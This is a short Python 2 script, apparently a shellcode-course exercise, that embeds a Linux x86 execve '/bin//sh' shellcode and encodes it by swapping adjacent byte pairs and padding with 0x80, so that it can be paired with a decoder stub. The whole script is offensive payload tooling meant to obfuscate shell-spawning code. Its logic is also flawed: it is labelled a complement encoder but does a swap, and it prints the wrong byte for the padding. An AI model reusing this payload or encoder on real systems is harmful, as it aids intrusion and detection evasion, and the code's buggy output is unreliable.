#!/usr/bin/python

# Python Complement Encoder 

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80");


bArray = bytearray(shellcode)
counter = 0
encoded2 = ""

while counter < len(bArray):

        # if last element
        if counter == len(bArray) -1:
                encoded2 += '0x'
                encoded2 += '%02x,' %(bArray[counter] & 0xff)
                # if the total odd
                if (counter + 1) % 2 != 0:
                        bArray.append(128)
                        encoded2 += '0x'
                        encoded2 += '%02x,' %(bArray[counter] & 0xff)

                break

	bArray[counter], bArray[counter + 1] = bArray[counter + 1], bArray[counter]
	encoded2 += '0x'
	encoded2 += '%02x,' %(bArray[counter] & 0xff)

	encoded2 += '0x'
	encoded2 += '%02x,' %(bArray[counter + 1] & 0xff)

	counter += 2

print ' '.join(format(x, '02x') for x in bArray)

print 'Encoded shellcode ...'

print encoded2

print 'Len Shellcode: %d' % len(bArray)
